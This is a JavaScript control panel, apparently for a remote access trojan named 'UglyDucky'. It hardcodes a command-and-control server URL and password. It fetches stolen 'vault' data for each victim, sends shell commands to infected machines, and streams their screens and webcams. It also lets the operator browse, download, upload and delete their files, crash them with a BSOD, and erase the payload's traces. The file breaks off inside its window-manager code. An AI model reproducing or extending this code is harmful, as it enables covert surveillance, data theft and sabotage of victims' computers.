// File: app.js
// ==================================================================
// --- CONFIGURATION ---
// ==================================================================
const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 
const DASHBOARD_PASSWORD = "ducky_admin_2024"; 
// ==================================================================

// --- GLOBAL STATE ---
let activeNodeId = null; 
let globalData = [];
let allNodes = []; 

// --- Interactive Map State ---
let leafletMap = null;
let leafletMarkers = [];

// --- Live View State ---
let streamInterval = null;
let streamSwitchTime = 0; // Prevents fetching old cached frames when switching
let streamTimeoutTracker = null; // Triggers 10s warning if no frames arrive
let currentStreamSessionId = null; // Strikout trailing frames from older sessions entirely
const STREAM_POLL_RATE = 250; 

// --- Terminal & Filesystem State ---
let terminalPollInterval = null; 
let fsPollInterval = null;
let currentFsPath = null;
const FS_POLL_RATE = 2000; 
const FS_POLL_TIMEOUT = 20000; 

// --- Floating UI State ---
let isFloatingMode = false;
let floatZIndex = 100;
let activeFloatPanel = null;
let isDraggingFloat = false;
let isResizingFloat = false;
let floatStartX = 0, floatStartY = 0;
let panelStartLeft = 0, panelStartTop = 0;
let panelStartWidth = 0, panelStartHeight = 0;
let floatingStates = {}; // Stores { left, top, width, height, zIndex } keyed by panel.id

// ==========================================
// UTILITIES
// ==========================================
// Bulletproof coordinate parser to prevent Leaflet NaN crashes
function getSafeCoord(val, isLat) {
    const defaultCoord = isLat ? 28.5383 : -81.3792;
    if (val === undefined || val === null || val === '') {
        return defaultCoord;
    }
    const parsed = parseFloat(val);
    if (isNaN(parsed)) {
        return defaultCoord;
    }
    return parsed;
}

// ==========================================
// INITIALIZATION
// ==========================================
document.addEventListener("DOMContentLoaded", () => {
    switchTab('extraction'); 
    initDragAndDrop();
    initResizers();
    initFloatingWindowManager();
    renderNodesList(); 
});

// ==========================================
// LEAFLET MAP ENGINE
// ==========================================
function initMap() {
    const mapContainer = document.getElementById('map-container');
    if (!mapContainer || leafletMap) {
        return;
    }

    const worldBounds = [
        [-90, -180], 
        [90, 180]    
    ];

    leafletMap = L.map('map-container', {
        zoomControl: false, 
        attributionControl: false, 
        maxBounds: worldBounds,       
        maxBoundsViscosity: 1.0,      
        minZoom: 2                    
    }).setView([20, 0], 2);

    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        subdomains: 'abcd',
        maxZoom: 19,
        minZoom: 2,
        noWrap: true,                 
        bounds: worldBounds
    }).addTo(leafletMap);

    // Dynamic map reflow for free-floating resizing operations
    new ResizeObserver(() => {
        if (leafletMap) leafletMap.invalidateSize();
    }).observe(mapContainer);

    setTimeout(() => {
        leafletMap.invalidateSize(true);
        renderMap(); 
    }, 100);
}

function renderMap() {
    if (!leafletMap) {
        return;
    }

    leafletMarkers.forEach(m => leafletMap.removeLayer(m));
    leafletMarkers = [];
    
    allNodes.forEach(node => {
        let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
        let safeLat = getSafeCoord(node.lat, true);
        let safeLng = getSafeCoord(node.lng, false);
        
        const customHtml = `
            <div class="map-dot ${dotColor}" onclick="leafletMap.flyTo([${safeLat}, ${safeLng}], 5)">
                <div class="map-tooltip text-[10px] text-left pointer-events-none">
                    <div class="font-bold text-white border-b border-gray-700 pb-1 mb-1">${node.id}</div>
                    <div class="text-gray-400">IP: <span class="text-cyberBlue">${node.ip}</span></div>
                    <div class="text-gray-400">OS: <span class="text-white">${node.os}</span></div>
                    <div class="text-gray-400">STAT: <span class="${dotColor}">${node.status.toUpperCase()}</span></div>
                </div>
            </div>`;

        const customIcon = L.divIcon({
            className: 'bg-transparent border-none', 
            iconSize: [14, 14], 
            iconAnchor: [7, 7], 
            html: customHtml
        });

        const marker = L.marker([safeLat, safeLng], { icon: customIcon }).addTo(leafletMap);
        leafletMarkers.push(marker);
    });
}

// ==========================================
// AUTHENTICATION & FETCHING
// ==========================================
document.getElementById("deviceId").addEventListener("keypress", function(e) {
    if (e.key === "Enter") { 
        e.preventDefault(); 
        fetchData(); 
    }
});

async function fetchData() {
    const deviceId = document.getElementById('deviceId').value.trim();
    if (!deviceId) {
        return showToast("Target Identifier missing.", "error");
    }

    const statusMsg = document.getElementById('statusMsg');
    const btn = document.getElementById('connectBtn');
    
    allNodes = [];
    globalData = [];
    activeNodeId = null;
    document.getElementById('output').innerHTML = "";
    document.getElementById('filterContainer').classList.add('hidden');
    document.getElementById('exportBtn').classList.add('hidden');
    
    // Clear out session specific panels
    document.getElementById('fs-active-node').innerText = "None";
    document.getElementById('fsTbody').innerHTML = `<tr><td colspan="4" class="text-center p-4 text-gray-600">Select target node to load files...</td></tr>`;
    document.getElementById('terminal-connection-msg').innerText = "Waiting for node...";
    stopStream();

    renderMap();
    renderNodesList();

    statusMsg.classList.remove('hidden');
    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Contacting Render Server...';
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';

    try {
        const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
            method: 'GET',
            headers: { 
                "X-Dashboard-Password": DASHBOARD_PASSWORD,
                "Accept": "application/json"
            }
        });
        
        if (!nodeResponse.ok) {
            const errData = await nodeResponse.json().catch(() => ({}));
            throw new Error(`[Status: ${nodeResponse.status}] ${errData.error || nodeResponse.statusText}`);
        }
        
        const nodeData = await nodeResponse.json();
        
        if (!nodeData || typeof nodeData !== 'object' || Array.isArray(nodeData)) {
            throw new Error("Target data malformed. Backend returned invalid format.");
        }
        
        nodeData.lat = getSafeCoord(nodeData.lat, true);
        nodeData.lng = getSafeCoord(nodeData.lng, false);
        
        activeNodeId = nodeData.id;
        allNodes = [nodeData]; 
        renderNodesList();
        renderMap();
        
        // This triggers the Auto-File Explorer and Shell
        selectNode(activeNodeId); 

        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
        
        const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
            method: 'GET',
            headers: { 
                "X-Dashboard-Password": DASHBOARD_PASSWORD,
                "Accept": "application/json"
            }
        });
        
        if (!logsResponse.ok) {
            throw new Error("API Error fetching vault logs.");
        }
        
        const logsData = await logsResponse.json();
        globalData = logsData;

        const transitionToControlPanel = () => {
            switchTab('rat');
            setTimeout(() => {
                if (leafletMap) {
                    leafletMap.invalidateSize(true);
                    leafletMap.flyTo([nodeData.lat, nodeData.lng], 4, {duration: 1.5});
                }
            }, 300); 
        };

        if (globalData.length === 0) {
            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>Node active, but no vault data exists yet.`;
            showToast("Node is active but has no vault data.", "error");
            setTimeout(transitionToControlPanel, 1000); 
        } else {
            statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
            document.getElementById('exportBtn').classList.remove('hidden');
            buildFilters();
            renderCards(globalData, document.getElementById('output'));
            showToast("Authentication successful! Data loaded.", "success");
            setTimeout(transitionToControlPanel, 1000); 
        }

    } catch (error) {
        statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Error: ${error.message}`;
        showToast("Backend Connection Failed", "error");
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole mr-2"></i> Decrypt';
    }
}

// ==========================================
// RENDER & SELECTION LOGIC (TARGETS)
// ==========================================
function renderNodesList() {
    const container = document.getElementById('nodes-list');
    if(!container) {
        return;
    }
    container.innerHTML = '';
    
    if (allNodes.length === 0) {
        container.innerHTML = `<p class="text-gray-500 p-4 text-xs font-mono">Authenticate with a Target ID to begin.</p>`;
        return;
    }

    allNodes.forEach(node => {
        let dotColor = node.status === 'green' ? 'bg-green-500' : (node.status === 'red' ? 'bg-red-500' : 'bg-yellow-500');
        let activeBorder = 'border border-neon bg-neon/5'; 
        let activeLine = '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>';
        let pulse = node.status === 'green' ? 'animate-pulse' : '';

        let osLower = (node.os || "").toLowerCase();
        let osIconClass = 'fa-brands fa-windows text-cyberBlue'; 
        
        if (osLower.includes('win')) {
            osIconClass = 'fa-brands fa-windows text-cyberBlue';
        } else if (osLower.includes('mac') || osLower.includes('darwin')) {
            osIconClass = 'fa-brands fa-apple text-gray-300';
        } else if (osLower.includes('linux') || osLower.includes('ubuntu')) {
            osIconClass = 'fa-brands fa-linux text-yellow-400';
        } else if (osLower.length > 0) {
            osIconClass = 'fa-solid fa-desktop text-gray-400';
        }
        
        let safeLat = getSafeCoord(node.lat, true);
        let safeLng = getSafeCoord(node.lng, false);

        container.innerHTML += `
            <div class="p-2 ${activeBorder} rounded-lg relative overflow-hidden group transition-all cursor-pointer" onclick="if(leafletMap) leafletMap.flyTo([${safeLat}, ${safeLng}], 5)">
                ${activeLine}
                <div class="flex justify-between items-start mb-1 pl-2">
                    <div class="flex items-center gap-2">
                        <i class="${osIconClass} text-base"></i>
                        <div>
                            <p class="text-xs font-bold text-white truncate max-w-[120px]">${node.id}</p>
                            <p class="text-[9px] text-gray-400 font-mono">${node.ip}</p>
                        </div>
                    </div>
                    <span class="w-2 h-2 mt-1 rounded-full ${dotColor} ${pulse} shadow-[0_0_8px_currentColor]"></span>
                </div>
                <p class="text-[9px] text-gray-500 pl-2 truncate" title="${node.os}">${node.os}</p>
            </div>`;
    });
}

// ==========================================
// TERMINAL LOGIC (REAL PASSTHROUGH)
// ==========================================
window.selectNode = function(nodeId) {
    appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
    
    // Automatically start FS rendering
    document.getElementById('fs-active-node').innerText = nodeId;
    requestDirectoryListing('DRIVES');

    if (terminalPollInterval) {
        clearInterval(terminalPollInterval);
    }
    
    terminalPollInterval = setInterval(async () => {
        if (!activeNodeId) {
            return;
        }
        try {
            const res = await fetch(`${C2_LISTENER_URL}/shell/${activeNodeId}`, {
                headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
            });
            if (res.ok) {
                const data = await res.json();
                if (data.outputs && data.outputs.length > 0) {
                    data.outputs.forEach(out => appendTerminalText(out, "output"));
                }
            }
        } catch(e) {
            // Silently fail polling
        }
    }, 2000); 
};

function appendTerminalText(msg, type="system") {
    const term = document.getElementById('terminal-output');
    if(!term) {
        return;
    }
    
    const promptEl = term.querySelector('.terminal-prompt');
    if (promptEl) {
        promptEl.remove();
    }

    const line = document.createElement('div');
    if (type === "system") {
        line.className = "text-gray-500 mt-1 italic"; 
        line.innerText = `[*] ${msg}`;
    } else if (type === "user") {
        line.className = "text-white mt-1 font-bold";
        line.innerText = msg; 
    } else if (type === "output") {
        line.className = "text-gray-300 mt-1 whitespace-pre-wrap break-all"; 
        line.innerText = msg;
    }
    term.appendChild(line);
    
    const prompt = document.createElement('div'); 
    prompt.className = "mt-2 text-green-400 terminal-prompt flex flex-shrink-0"; 
    prompt.innerHTML = `<span class="mr-2">C:\\Users\\System></span> <span class="cursor-blink"></span>`;
    term.appendChild(prompt);
    
    term.scrollTop = term.scrollHeight;
}

window.termLog = function(msg) { 
    appendTerminalText(msg, "system"); 
};

window.executeTermCommand = function(inputEl) {
    const val = inputEl.value.trim();
    if(!val) {
        return;
    }
    
    appendTerminalText(`C:\\Users\\System> ${val}`, "user");
    
    setTimeout(() => {
        if(val.toLowerCase() === 'clear' || val.toLowerCase() === 'cls') { 
            const term = document.getElementById('terminal-output');
            term.innerHTML = `
                <div class="text-cyberBlue">UglyDucky Shell v2.5.0</div>
                <div class="mt-2 text-green-400 terminal-prompt flex flex-shrink-0">
                    <span class="mr-2">C:\\Users\\System></span> <span class="cursor-blink"></span>
                </div>`;
            inputEl.value = ''; 
            return; 
        }
        
        if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
            termLog(`Forwarding critical payload to C2 server...`);
            sendCommandToNode(activeNodeId, val.toUpperCase() === 'BURN' ? "SELF_DESTRUCT" : "BSOD");
        } else {
            termLog(`Executing command on target: ${val}...`);
            sendCommandToNode(activeNodeId, `SHELL:${val}`);
        }
    }, 50);
    
    inputEl.value = '';
};

// ==========================================
// C2 COMMAND FUNCTIONS
// ==========================================
async function sendCommandToNode(deviceId, command) {
    if (!deviceId) {
        return showToast("No active node selected!", "error");
    }
    
    try {
        const response = await fetch(`${C2_LISTENER_URL}/issue`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Dashboard-Password': DASHBOARD_PASSWORD 
            },
            body: JSON.stringify({ device_id: deviceId, command: command })
        });
        
        if (!response.ok) {
            throw new Error(`Server responded with ${response.status}`);
        }
    } catch (error) {
        showToast(`Failed to send command.`, "error");
        termLog(`[ERROR] Failed to send command: ${error.message}`);
    }
}

// ==========================================
// LIVE VIEW STREAMING
// ==========================================
function setStreamLoadingState() {
    const spinner = document.getElementById('liveViewSpinner');
    const imageEl = document.getElementById('liveViewImage');
    
    // Clear out visually
    imageEl.style.display = 'none';
    imageEl.src = ''; 
    
    // Setup spinner
    spinner.style.display = 'flex';
    spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px]">Retrieving stream frames...</p>`;
    
    if (streamTimeoutTracker) {
        clearTimeout(streamTimeoutTracker);
    }
    
    streamTimeoutTracker = setTimeout(() => {
        spinner.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px] text-center px-4">Timeout exceeded (10s).<br>Target may be offline.</p>`;
    }, 10000);
}

window.toggleStream = function() {
    if (!activeNodeId) {
        return showToast("No active node selected!", "error");
    }

    if (streamInterval) {
        stopStream();
    } else {
        startStream();
    }
};

window.changeStreamQuality = function(val) {
    document.getElementById('qualityLabel').innerText = `Q:${val}`;
    if (streamInterval) {
        let streamTarget = document.getElementById('streamTarget').value;
        sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${val}`);
    }
};

window.startStream = async function() {
    if (!activeNodeId) {
        return showToast("No active node selected!", "error");
    }

    // Ensure panel is not minimized
    const panel = document.getElementById('panel-live');
    if (panel.dataset.minimized === 'true') {
        toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-live');
    }

    if (streamInterval) {
        stopStream(); 
    }

    const targetVal = document.getElementById('streamTarget').value;
    const quality = document.getElementById('streamQuality').value;
    const title = document.getElementById('liveViewTitle');
    const toggleBtn = document.getElementById('streamToggleBtn');
    
    // Unique ID generation for this specific fetch session loop
    currentStreamSessionId = Date.now();
    streamSwitchTime = Date.now();
    setStreamLoadingState();

    toggleBtn.className = "w-4 h-4 rounded-full bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white flex items-center justify-center text-[8px]";
    toggleBtn.innerHTML = '<i class="fa-solid fa-stop"></i>';
    toggleBtn.title = "Stop Stream";

    title.innerHTML = targetVal.includes("SCREEN") 
        ? `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}` 
        : `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;

    termLog(`Initiating stream for ${targetVal} at Quality ${quality}...`);
    await sendCommandToNode(activeNodeId, `START_STREAM:${targetVal}|${quality}`);
    
    // Bind dynamic source change
    document.getElementById('streamTarget').onchange = () => {
        if(streamInterval) {
            currentStreamSessionId = Date.now(); // Renew the loop session tracking
            streamSwitchTime = Date.now();
            setStreamLoadingState(); 
            termLog(`Switching stream source...`);
            
            const newTarget = document.getElementById('streamTarget').value;
            sendCommandToNode(activeNodeId, `START_STREAM:${newTarget}|${document.getElementById('streamQuality').value}`);
            
            title.innerHTML = newTarget.includes("SCREEN") 
                ? `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}` 
                : `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
        }
    };

    streamInterval = setInterval(fetchFrame, STREAM_POLL_RATE);
};

async function fetchFrame() {
    if (!activeNodeId || !currentStreamSessionId) {
        return;
    }
    
    const mySessionId = currentStreamSessionId;

    // Ignore fetched frames for 3.5 seconds after a switch to prevent bleeding old cache
    if (Date.now() - streamSwitchTime < 3500) {
        return;
    }
    
    const targetVal = document.getElementById('streamTarget').value;
    const cacheKey = targetVal === 'WEBCAM' ? 'webcam' : targetVal.toLowerCase();
    
    try {
        const response = await fetch(`${C2_LISTENER_URL}/frames/${activeNodeId}/${cacheKey}`, {
            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
        });
        
        // Critical verification: did the user click stop or switch monitors while we were fetching?
        if (mySessionId !== currentStreamSessionId) {
            return; // Destroy the delayed frame to prevent it from bleeding over
        }
        
        if (response.ok) {
            const data = await response.json();
            if (data && data.frame) {
                const imageEl = document.getElementById('liveViewImage');
                imageEl.src = `data:image/jpeg;base64,${data.frame}`;
                
                if (streamTimeoutTracker) {
                    clearTimeout(streamTimeoutTracker);
                    streamTimeoutTracker = null;
                }
                
                document.getElementById('liveViewSpinner').style.display = 'none';
                imageEl.style.display = 'block';
            }
        }
    } catch (e) {
        // Silent error
    }
}

window.stopStream = function() {
    if (streamInterval) {
        clearInterval(streamInterval);
        streamInterval = null;
    }
    if (streamTimeoutTracker) {
        clearTimeout(streamTimeoutTracker);
        streamTimeoutTracker = null;
    }
    
    // Flushes validation so trailing delayed fetches get nuked automatically
    currentStreamSessionId = null;
    
    if (activeNodeId) {
        sendCommandToNode(activeNodeId, "STOP_STREAM");
        termLog(`Stream stopped for ${activeNodeId}.`);
    }

    const toggleBtn = document.getElementById('streamToggleBtn');
    if (toggleBtn) {
        toggleBtn.className = "w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]";
        toggleBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
        toggleBtn.title = "Play Stream";
    }
    
    const imageEl = document.getElementById('liveViewImage');
    imageEl.style.display = 'none';
    imageEl.src = ''; // Guarantee visual cache flush
    
    document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
    
    const spinner = document.getElementById('liveViewSpinner');
    if(spinner) {
        spinner.style.display = 'flex';
        spinner.innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i><p class="text-gray-500 font-mono text-[10px] mt-2">Stream Idle</p>`;
    }
};

// ==========================================
// POWERFUL MODULES (SCORCHED EARTH & FUN)
// ==========================================
window.triggerBSOD = function() {
    termLog('Command queued: BSOD (Blue Screen)');
    sendCommandToNode(activeNodeId, 'BSOD');
};

window.triggerScorchedEarth = function() {
    if(confirm('WARNING: THIS WILL DELETE THE PAYLOAD AND ALL TRACES.\n\nContinue?')) {
        termLog('Command queued: Payload Self-Destruct');
        sendCommandToNode(activeNodeId, 'SELF_DESTRUCT');
    }
};

// ==========================================
// FILE EXPLORER
// ==========================================
function requestDirectoryListing(path) {
    if (!activeNodeId) {
        return;
    }

    if (fsPollInterval) {
        clearInterval(fsPollInterval);
    }

    currentFsPath = path;
    updateBreadcrumbs(path);
    
    const tbody = document.getElementById('fsTbody');
    tbody.innerHTML = `
        <tr class="border-b border-gray-800/60">
            <td colspan="4" class="p-4 text-center text-gray-400 font-mono">
                <i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-lg"></i>
                <p class="mt-1 text-[10px]">Loading "${path}"...</p>
            </td>
        </tr>
    `;

    sendCommandToNode(activeNodeId, `LIST_DIR:${path}`);

    const pollStartTime = Date.now();
    
    fsPollInterval = setInterval(async () => {
        if (Date.now() - pollStartTime > FS_POLL_TIMEOUT) {
            clearInterval(fsPollInterval);
            fsPollInterval = null;
            tbody.innerHTML = `
                <tr class="border-b border-gray-800/60">
                    <td colspan="4" class="p-4 text-center text-red-500 font-mono text-[10px]">
                        Request timed out. Target may be offline.
                    </td>
                </tr>
            `;
            return;
        }

        try {
            const response = await fetch(`${C2_LISTENER_URL}/fs/${activeNodeId}`, {
                headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
            });
            
            if (response.ok) {
                clearInterval(fsPollInterval);
                fsPollInterval = null;
                const data = await response.json();
                renderFileSystem(data);
            }
        } catch (e) {
            console.error("FS poll error:", e);
        }
    }, FS_POLL_RATE);
}

function renderFileSystem(data) {
    const tbody = document.getElementById('fsTbody');
    tbody.innerHTML = '';

    if (data.error) {
        tbody.innerHTML = `
            <tr class="border-b border-gray-800/60">
                <td colspan="4" class="p-4 text-center text-red-500 font-mono text-[10px]">
                    <i class="fa-solid fa-triangle-exclamation mr-1"></i>${escapeHtml(data.error)}
                </td>
            </tr>
        `;
        return;
    }
    
    if (!data.contents || data.contents.length === 0) {
        tbody.innerHTML = `
            <tr class="border-b border-gray-800/60">
                <td colspan="4" class="p-4 text-center text-gray-500 font-mono text-[10px]">
                    Directory is empty.
                </td>
            </tr>
        `;
        return;
    }

    data.contents.sort((a, b) => {
        if (a.type === b.type) {
            return a.name.localeCompare(b.name, undefined, {numeric: true});
        }
        return a.type === 'directory' || a.type === 'drive' ? -1 : 1;
    });

    data.contents.forEach(item => {
        let icon, color, action;
        const fullPath = (data.path === 'DRIVES' ? item.name : `${data.path.replace(/\\$/, '')}\\${item.name}`).replace(/\\/g, '\\\\');

        let actionButtons = '';
        if (item.type !== 'drive' && item.type !== 'inaccessible') {
            const isDir = item.type === 'directory';
            
            if (!isDir) {
                actionButtons += `
                    <button class="text-cyberBlue hover:text-white mx-0.5" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')">
                        <i class="fa-solid fa-download"></i>
                    </button>
                `;
            }
            
            actionButtons += `
                <button class="text-yellow-500 hover:text-white mx-0.5" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')">
                    <i class="fa-solid fa-pen"></i>
                </button>
            `;
            
            actionButtons += `
                <button class="text-red-500 hover:text-white mx-0.5" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})">
                    <i class="fa-solid fa-trash"></i>
                </button>
            `;
        }

        switch (item.type) {
            case 'drive':
                icon = 'fa-hdd'; 
                color = 'text-gray-400';
                action = `onclick="requestDirectoryListing('${fullPath}')"`;
                break;
            case 'directory':
                icon = 'fa-folder'; 
                color = 'text-yellow-500';
                action = `onclick="requestDirectoryListing('${fullPath}')"`;
                break;
            case 'file':
                icon = 'fa-file-lines'; 
                color = 'text-cyberBlue';
                action = ``;
                break;
            default:
                icon = 'fa-ban'; 
                color = 'text-red-600';
                action = `title="Permission Denied"`;
                break;
        }

        const size = item.size > 0 ? formatBytes(item.size) : '';

        const row = document.createElement('tr');
        row.className = 'border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer';
        
        row.innerHTML = `
            <td class="p-1.5 pl-2 text-center ${color}" ${action}>
                <i class="fa-regular ${icon}"></i>
            </td>
            <td class="p-1.5 font-bold text-gray-300 truncate max-w-[100px]" ${action} title="${escapeHtml(item.name)}">
                ${escapeHtml(item.name)}
            </td>
            <td class="p-1.5 text-right text-gray-400 whitespace-nowrap" ${action}>
                ${size}
            </td>
            <td class="p-1.5 text-center whitespace-nowrap">
                ${actionButtons}
            </td>
        `;
        
        tbody.appendChild(row);
    });
}

window.deleteItem = function(fullPath, isDir) {
    const type = isDir ? 'folder' : 'file';
    if(confirm(`Are you sure you want to permanently delete this ${type}?\n\nTarget: ${fullPath}`)) {
        sendCommandToNode(activeNodeId, `DELETE:${fullPath}`);
        showToast(`Delete command sent for ${fullPath}`);
        setTimeout(() => requestDirectoryListing(currentFsPath), 2000); 
    }
};

window.renameItem = function(fullPath, currentName) {
    const newName = prompt(`Enter new name for ${currentName}:`, currentName);
    if(newName && newName !== currentName) {
        const dirPath = fullPath.substring(0, fullPath.lastIndexOf('\\'));
        const newPath = dirPath + '\\' + newName;
        sendCommandToNode(activeNodeId, `RENAME:${fullPath}|${newPath}`);
        showToast(`Rename command sent.`);
        setTimeout(() => requestDirectoryListing(currentFsPath), 2000);
    }
};

let downloadPollInterval = null;
window.downloadFile = function(fullPath) {
    sendCommandToNode(activeNodeId, `DOWNLOAD_FILE:${fullPath}`);
    showToast(`Requesting download (May take a moment)`);
    
    if (downloadPollInterval) {
        clearInterval(downloadPollInterval);
    }
    
    const startTime = Date.now();
    
    downloadPollInterval = setInterval(async () => {
        if(Date.now() - startTime > 45000) { 
            clearInterval(downloadPollInterval);
            showToast("Download timed out or file too large.", "error");
            return;
        }
        
        try {
            const res = await fetch(`${C2_LISTENER_URL}/fs_download/${activeNodeId}`, { 
                headers: {'X-Dashboard-Password': DASHBOARD_PASSWORD} 
            });
            
            if (res.ok) {
                clearInterval(downloadPollInterval);
                const data = await res.json();
                
                if(data.error) {
                    showToast(`Download failed: ${data.error}`, "error");
                } else if(data.data && data.filename) {
                    const link = document.createElement('a');
                    link.href = 'data:application/octet-stream;base64,' + data.data;
                    link.download = data.filename;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    showToast("Download complete!", "success");
                }
            }
        } catch(e) { 
            // Silent error handles
        }
    }, 2000);
};

window.triggerUpload = function() { 
    document.getElementById('fileUploadInput').click(); 
};

document.getElementById('fileUploadInput').onchange = function(e) { 
    const file = e.target.files[0];
    if(!file) {
        return;
    }
    if(!currentFsPath || currentFsPath === 'DRIVES') {
        return showToast("Navigate to a directory first.", "error");
    }
    if(file.size > 10 * 1024 * 1024) {
        return showToast("File exceeds 10MB limit.", "error");
    }

    const reader = new FileReader();
    reader.onload = function(evt) {
        const base64Data = evt.target.result.split(',')[1];
        const destPath = currentFsPath.endsWith('\\') ? currentFsPath + file.name : currentFsPath + '\\' + file.name;
        
        sendCommandToNode(activeNodeId, `UPLOAD_FILE:${destPath}|${base64Data}`);
        showToast(`Uploading ${file.name}...`);
        
        setTimeout(() => requestDirectoryListing(currentFsPath), 3500);
    };
    reader.readAsDataURL(file);
    e.target.value = ''; 
};

function updateBreadcrumbs(path) {
    const container = document.getElementById('fsBreadcrumbs');
    container.innerHTML = '';
    
    if (!path || path === 'DRIVES') {
        container.innerHTML = `<span class="text-gray-500">Drives</span>`;
        return;
    }

    const parts = path.split('\\').filter(p => p);
    let currentPath = '';
    
    parts.forEach((part, index) => {
        currentPath += part + '\\\\';
        const isLast = index === parts.length - 1;
        
        if (isLast) {
            container.innerHTML += `<span class="text-white font-bold">${escapeHtml(part)}</span>`;
        } else {
            container.innerHTML += `
                <span class="text-gray-400 hover:text-white cursor-pointer" onclick="requestDirectoryListing('${currentPath}')">${escapeHtml(part)}</span>
                <span class="text-gray-600 mx-0.5">/</span>
            `;
        }
    });
}

function formatBytes(bytes, decimals = 1) {
    if (bytes === 0) {
        return '0 B';
    }
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

window.navigateUp = function() {
    if (!currentFsPath || currentFsPath === 'DRIVES') {
        requestDirectoryListing('DRIVES');
        return;
    }
    
    if (currentFsPath.endsWith(':\\') && currentFsPath.length === 3) {
        requestDirectoryListing('DRIVES');
        return;
    }
    
    const lastSlash = currentFsPath.replace(/\\$/, '').lastIndexOf('\\');
    
    if (lastSlash === -1) {
        requestDirectoryListing('DRIVES');
    } else if (lastSlash === 2 && currentFsPath[1] === ':') {
        let parentPath = currentFsPath.substring(0, lastSlash + 1);
        requestDirectoryListing(parentPath);
    } else {
        let parentPath = currentFsPath.substring(0, lastSlash);
        requestDirectoryListing(parentPath);
    }
};

// ==========================================
// UI & TAB LOGIC
// ==========================================
window.switchTab = function(tabId) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    
    document.getElementById('tab-extraction').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
    document.getElementById('tab-rat').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
    
    document.getElementById('view-' + tabId).classList.add('active');
    
    const activeColor = tabId === 'extraction' 
        ? 'bg-cyberBlue text-dark shadow-[0_0_15px_rgba(0,210,211,0.3)]' 
        : 'bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]';
        
    document.getElementById('tab-' + tabId).className = `px-6 py-1.5 rounded-md font-bold text-sm transition-all ${activeColor}`;

    if (tabId === 'rat') {
        if (!leafletMap) {
            initMap();
        } else {
            setTimeout(() => leafletMap.invalidateSize(true), 100);
        }
    }
};

window.showToast = function(msg, type="success") {
    const toast = document.getElementById('toast');
    const icon = document.getElementById('toastIcon');
    document.getElementById('toastMsg').innerText = msg;
    
    if (type === "error") {
        toast.classList.replace('border-neon', 'border-red-500');
        icon.className = "fa-solid fa-triangle-exclamation text-red-500";
    } else {
        toast.classList.replace('border-red-500', 'border-neon');
        icon.className = "fa-solid fa-circle-check text-neon";
    }
    
    toast.classList.replace('translate-y-24', 'translate-y-0');
    toast.classList.replace('opacity-0', 'opacity-100');
    
    setTimeout(() => {
        toast.classList.replace('translate-y-0', 'translate-y-24');
        toast.classList.replace('opacity-100', 'opacity-0');
    }, 3000);
};

// ==========================================
// TILING WINDOW MANAGER
// ==========================================
let draggedPanel = null;
function initDragAndDrop() {
    document.querySelectorAll('.draggable-header').forEach(header => {
